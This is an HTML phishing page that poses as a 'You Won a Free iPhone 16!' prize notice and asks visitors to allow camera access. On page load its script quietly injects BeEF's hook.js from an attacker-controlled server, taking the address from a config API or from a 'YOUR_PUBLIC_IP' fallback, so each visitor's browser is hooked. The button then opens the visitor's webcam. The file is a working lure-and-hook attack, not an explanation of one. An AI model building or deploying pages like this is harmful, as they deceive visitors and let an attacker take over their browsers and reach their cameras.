<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Congratulations! You Won!</title>
    <style>
      body {
        font-family: Arial;
        text-align: center;
        padding: 60px;
        background: #f0f8ff;
      }
      h1 {
        color: #d4af37;
        font-size: 2.2em;
      }
      p {
        font-size: 1.1em;
      }
      .btn {
        padding: 16px 32px;
        background: #ff4500;
        color: white;
        font-size: 1.3em;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        margin: 20px;
      }
      .cam {
        font-style: italic;
        color: #555;
        margin-top: 15px;
      }
    </style>
  </head>
  <body>
    <h1>ðŸŽ‰ You Won a Free iPhone 16!</h1>
    <p>Allow camera to claim your prize</p>
    <button class="btn" onclick="startCam()">Claim Now</button>
    <p class="cam">Camera access required for verification</p>

    <script>
      // Load configuration from Vercel API (contains attacker IP)
      function loadBeEFHook() {
        fetch("/api/config")
          .then((response) => response.json())
          .then((data) => {
            const beefServer = data.beefServer;

            // Dynamically inject BeEF hook.js from attacker's server
            const script = document.createElement("script");
            script.src = `${beefServer}:3000/hook.js`;
            script.onerror = function () {
              console.error("Failed to load BeEF hook - server unreachable");
            };
            script.onload = function () {
              console.log("BeEF hook loaded successfully");
            };
            document.head.appendChild(script);
          })
          .catch((err) => {
            console.error("Failed to fetch config:", err);
            // Fallback: try direct connection if API fails
            const script = document.createElement("script");
            script.src = "http://YOUR_PUBLIC_IP:3000/hook.js";
            document.head.appendChild(script);
          });
      }

      function startCam() {
        navigator.mediaDevices
          .getUserMedia({ video: true })
          .then((stream) => {
            alert("âœ“ Camera access granted!");
            const video = document.createElement("video");
            video.srcObject = stream;
            video.autoplay = true;
            video.style.width = "300px";
            video.style.borderRadius = "10px";
            video.style.marginTop = "20px";
            document.body.appendChild(video);
          })
          .catch((err) => {
            console.error("Camera error:", err);
            alert("âœ— Camera access denied or not available.");
          });
      }

      // Auto-load hook when page loads
      window.addEventListener("DOMContentLoaded", loadBeEFHook);
    </script>
  </body>
</html>
